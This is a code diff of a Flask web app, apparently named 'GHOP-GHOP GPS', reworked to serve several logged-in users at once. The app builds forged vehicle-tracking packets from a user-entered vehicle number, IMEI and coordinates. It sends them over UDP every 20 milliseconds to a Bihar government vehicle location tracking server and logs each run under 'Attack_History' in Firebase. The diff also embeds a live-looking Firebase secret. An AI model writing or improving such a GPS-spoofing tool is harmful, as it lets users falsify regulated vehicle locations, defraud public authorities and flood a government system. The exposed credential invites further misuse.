@@ -3,17 +3,17 @@ from datetime import datetime, timedelta, timezone
 from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
 
 app = Flask(__name__)
-app.secret_key = "nitro_v82_final_whatsapp_edition"
+app.secret_key = "nitro_v82_final_multi_device_edition"
 
 FB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/"
 FB_SECRET = "hpa10b2FOtP4nP5aYjtMWSoq3bdp1n5sbH6lPDjE"
 
 TAG_LIST = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"]
 
-status = {"firing": False, "count": 0, "imei": "", "vno": "", "lat": "25.298801", "lon": "84.651033", "last_pkt": "Ready...", "session_id": ""}
+# Global store for multiple sessions
+user_sessions = {}
 
 def get_ist_time():
-    # Forced IST (+5:30) for Render Servers
     return datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
 
 LOGIN_HTML = """
@@ -68,14 +68,14 @@ DASH_HTML = """
 </head>
 <body>
     <div class="box">
-        <form action="/logout" method="post"><button style="color:red; background:none; border:1px solid red; padding:5px; cursor:pointer; font-size:10px;">LOGOUT: {{session['user']}}</button></form>
+        <form action="/logout" method="post"><button style="color:red; background:none; border:1px solid red; padding:5px; cursor:pointer; font-size:10px;">LOGOUT: {{user_id}}</button></form>
         <h2 style="margin-top:10px;">💋 GHOP-GHOP GPS 💋</h2>
         <div class="metric" id="cnt">0</div>
-        <form action="/action" method="post" class="grid" id="mainForm">
-            <div class="full"><label>VEHICLE NO</label><input type="text" name="vno" id="vno" value="{{vno}}" oninput="this.value = this.value.toUpperCase(); updatePreview();" onblur="checkVehicle()"></div>
-            <div class="full"><label>IMEI</label><input type="text" name="imei" id="imei" value="{{imei}}" oninput="updatePreview();"></div>
-            <div><label>LATITUDE</label><input type="text" name="lat" id="lat" value="{{lat}}" oninput="updatePreview();"></div>
-            <div><label>LONGITUDE</label><input type="text" name="lon" id="lon" value="{{lon}}" oninput="updatePreview();"></div>
+        <form action="/action" method="post" class="grid">
+            <div class="full"><label>VEHICLE NO</label><input type="text" name="vno" id="vno" value="{{status.vno}}" oninput="this.value = this.value.toUpperCase(); updatePreview();" onblur="checkVehicle()"></div>
+            <div class="full"><label>IMEI</label><input type="text" name="imei" id="imei" value="{{status.imei}}" oninput="updatePreview();"></div>
+            <div><label>LATITUDE</label><input type="text" name="lat" id="lat" value="{{status.lat}}" oninput="updatePreview();"></div>
+            <div><label>LONGITUDE</label><input type="text" name="lon" id="lon" value="{{status.lon}}" oninput="updatePreview();"></div>
             <button type="button" class="btn gps full" onclick="getLocation()">📍 GET CURRENT LOCATION</button>
             <div class="full"><label>📋 PACKET PREVIEW (MIJO FORMAT)</label><div class="preview" id="preview">Ready...</div></div>
             <button class="btn start full" name="btn" value="start">🔥 START ENGINE</button>
@@ -86,20 +86,20 @@ DASH_HTML = """
     <div id="map"></div>
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
-        var map = L.map('map').setView([{{lat or 25.298801}}, {{lon or 84.651033}}], 15);
+        var map = L.map('map').setView([{{status.lat}}, {{status.lon}}], 15);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-        var marker = L.marker([{{lat or 25.298801}}, {{lon or 84.651033}}]).addTo(map);
-        function updateMap(lat, lon) { let pos = [parseFloat(lat), parseFloat(lon)]; map.setView(pos, 15); marker.setLatLng(pos); }
-        function getLocation() { if (navigator.geolocation) { navigator.geolocation.getCurrentPosition(pos => { let lt = pos.coords.latitude.toFixed(6); let ln = pos.coords.longitude.toFixed(6); document.getElementById('lat').value = lt; document.getElementById('lon').value = ln; updateMap(lt, ln); updatePreview(); }, (err) => alert("Error: " + err.message), { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }); } }
+        var marker = L.marker([{{status.lat}}, {{status.lon}}]).addTo(map);
+        function updateMap(lat, lon) { marker.setLatLng([lat, lon]); map.setView([lat, lon], 15); }
+        function getLocation() { if (navigator.geolocation) { navigator.geolocation.getCurrentPosition(pos => { let lt = pos.coords.latitude.toFixed(6); let ln = pos.coords.longitude.toFixed(6); document.getElementById('lat').value = lt; document.getElementById('lon').value = ln; updateMap(lt, ln); updatePreview(); }, null, {enableHighAccuracy:true}); } }
         
         function updatePreview() {
             let tags = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"];
-            let count = parseInt(document.getElementById('cnt').innerText) || 0;
-            let tag = tags[count % tags.length];
+            let cnt = parseInt(document.getElementById('cnt').innerText) || 0;
+            let tag = tags[cnt % tags.length];
             let imei = document.getElementById('imei').value;
             let vno = document.getElementById('vno').value;
-            let lat = parseFloat(document.getElementById('lat').value || 0).toFixed(6);
-            let lon = parseFloat(document.getElementById('lon').value || 0).toFixed(6);
+            let lat = document.getElementById('lat').value;
+            let lon = document.getElementById('lon').value;
             let d = new Date().toLocaleDateString('en-GB').replace(/\//g, '');
             let t = new Date().toLocaleTimeString('en-GB', {hour12:false}).replace(/:/g, '');
             let str = `$PVT,${tag},1.ONTC,NR,01,L,${imei},${vno},1,${d},${t},${lat},N,${lon},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*`;
@@ -107,44 +107,46 @@ DASH_HTML = """
         }
 
         async function checkVehicle() {
-            let vno = document.getElementById('vno').value.toUpperCase().trim(); if(!vno) return;
-            let res = await fetch(`/check_vehicle?vno=${vno}`); let data = await res.json();
+            let vno = document.getElementById('vno').value.toUpperCase();
+            let res = await fetch(`/check_vehicle?vno=${vno}`);
+            let data = await res.json();
             if(data.imei) { document.getElementById('imei').value = data.imei; updatePreview(); }
         }
 
-        setInterval(() => { fetch('/data').then(r => r.json()).then(d => { 
-            document.getElementById('cnt').innerText = d.count;
-            if(d.firing) document.getElementById('preview').innerText = d.last_pkt;
-            else updatePreview();
-        }); }, 1000);
+        setInterval(() => {
+            fetch('/data').then(r => r.json()).then(d => {
+                document.getElementById('cnt').innerText = d.count;
+                if(d.firing) document.getElementById('preview').innerText = d.last_pkt;
+                else updatePreview();
+            });
+        }, 1000);
         updatePreview();
     </script>
 </body>
 </html>
 """
 
-def log_to_firebase():
+def log_to_firebase(uid, status_obj):
     try:
         now = get_ist_time()
-        sid = status["session_id"]
-        # Har attack alag session folder mein save hoga
-        path = f"{FB_URL}/Attack_History/{now.strftime('%Y-%m-%d')}/{session['user']}/{status['vno']}/{sid}.json?auth={FB_SECRET}"
-        log_data = {"Vehicle_No": status["vno"], "IMEI_No": status["imei"], "Lat": status["lat"], "Lon": status["lon"], "Start_Time": now.strftime('%H:%M:%S'), "Status": "Active"}
-        requests.put(path, json=log_data, timeout=5)
-        requests.put(f"{FB_URL}/Data_Records/{status['vno']}.json?auth={FB_SECRET}", json=log_data, timeout=5)
+        sid = status_obj["session_id"]
+        log_data = {"Vehicle_No": status_obj["vno"], "IMEI_No": status_obj["imei"], "Lat": status_obj["lat"], "Lon": status_obj["lon"], "Start_Time": now.strftime('%H:%M:%S')}
+        requests.put(f"{FB_URL}/Attack_History/{now.strftime('%Y-%m-%d')}/{uid}/{sid}_{status_obj['vno']}.json?auth={FB_SECRET}", json=log_data, timeout=5)
+        requests.put(f"{FB_URL}/Data_Records/{status_obj['vno']}.json?auth={FB_SECRET}", json=log_data, timeout=5)
     except: pass
 
-def firing_engine():
+def firing_engine(uid):
     target = ("vlts.bihar.gov.in", 9999)
-    while status["firing"]:
+    while user_sessions[uid]["firing"]:
         try:
-            tag = TAG_LIST[status["count"] % len(TAG_LIST)]
+            s = user_sessions[uid]
+            tag = TAG_LIST[s["count"] % len(TAG_LIST)]
             now = get_ist_time()
-            pkt_str = f"$PVT,{tag},1.ONTC,NR,01,L,{status['imei']},{status['vno']},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{status['lat']},N,{status['lon']},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*"
-            status["last_pkt"] = pkt_str
+            pkt = f"$PVT,{tag},1.ONTC,NR,01,L,{s['imei']},{s['vno']},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{s['lat']},N,{s['lon']},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*"
+            user_sessions[uid]["last_pkt"] = pkt
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.sendto(pkt_str.encode(), target)
-            status["count"] += 1
+            sock.sendto(pkt.encode(), target)
+            user_sessions[uid]["count"] += 1
             sock.close()
             time.sleep(0.02)
         except: time.sleep(1)
@@ -152,47 +154,51 @@ def firing_engine():
 @app.route('/', methods=['GET', 'POST'])
 def login():
     if 'user' in session: return redirect(url_for('dashboard'))
-    error = None
     if request.method == 'POST':
-        uid, pw = request.form.get('userid', '').strip(), request.form.get('password', '').strip()
+        uid = request.form.get('userid', '').strip()
+        pw = request.form.get('password', '').strip()
         data = requests.get(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}").json()
         if data and str(data.get('password')) == str(pw):
-            session['user'], session['access_level'] = uid, data.get('access_level', 'basic')
-            session['def_lat'], session['def_lon'] = str(data.get('lat', '25.298801')), str(data.get('lon', '84.651033'))
-            status.update({"lat": session['def_lat'], "lon": session['def_lon']})
+            session['user'] = uid
+            # Har user ki apni memory store
+            if uid not in user_sessions:
+                user_sessions[uid] = {"firing": False, "count": 0, "imei": "", "vno": "", "lat": str(data.get('lat', '25.298801')), "lon": str(data.get('lon', '84.651033')), "last_pkt": "Ready...", "session_id": ""}
             return redirect(url_for('dashboard'))
-        error = "INVALID ID OR PASSWORD"
-    return render_template_string(LOGIN_HTML, error=error)
+    return render_template_string(LOGIN_HTML)
 
 @app.route('/dashboard')
 def dashboard():
-    if 'user' not in session: return redirect(url_for('login'))
-    return render_template_string(DASH_HTML, session=session, **status)
+    uid = session.get('user')
+    if not uid: return redirect(url_for('login'))
+    return render_template_string(DASH_HTML, user_id=uid, status=user_sessions[uid])
 
 @app.route('/action', methods=['POST'])
 def action():
-    if 'user' not in session: return redirect(url_for('login'))
+    uid = session.get('user')
+    if not uid: return redirect(url_for('login'))
     val = request.form.get('btn')
-    if val == "start" and not status["firing"]:
-        status["session_id"] = get_ist_time().strftime('%H%M%S')
-        status.update({"imei": request.form.get('imei').strip(), "vno": request.form.get('vno').upper().strip(), "lat": request.form.get('lat').strip(), "lon": request.form.get('lon').strip(), "firing": True})
-        log_to_firebase()
-        threading.Thread(target=firing_engine, daemon=True).start()
-    elif val == "stop": status["firing"] = False
-    elif val == "reset": status.update({"firing": False, "count": 0, "imei": "", "vno": "", "lat": session.get('def_lat'), "lon": session.get('def_lon')})
+    if val == "start" and not user_sessions[uid]["firing"]:
+        user_sessions[uid].update({"firing":True, "session_id":get_ist_time().strftime('%H%M%S'), "imei":request.form.get('imei'), "vno":request.form.get('vno').upper(), "lat":request.form.get('lat'), "lon":request.form.get('lon')})
+        log_to_firebase(uid, user_sessions[uid])
+        threading.Thread(target=firing_engine, args=(uid,), daemon=True).start()
+    elif val == "stop": user_sessions[uid]["firing"] = False
+    elif val == "reset": user_sessions[uid].update({"firing":False, "count":0, "imei":"", "vno":""})
     return redirect(url_for('dashboard'))
 
 @app.route('/check_vehicle')
 def check_vehicle():
-    vno = request.args.get('vno', '').upper().strip()
+    vno = request.args.get('vno', '').upper()
     data = requests.get(f"{FB_URL}/Data_Records/{vno}.json?auth={FB_SECRET}").json()
-    return jsonify({"imei": data.get('IMEI_No')}) if data else jsonify({"imei": None})
+    return jsonify({"imei": data.get('IMEI_No')}) if data else jsonify({"imei":None})
 
 @app.route('/data')
-def data(): return jsonify(status)
+def data():
+    uid = session.get('user')
+    return jsonify(user_sessions.get(uid, {}))
 
 @app.route('/logout', methods=['POST'])
-def logout(): session.clear(); return redirect(url_for('login'))
+def logout():
+    session.clear(); return redirect(url_for('login'))
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
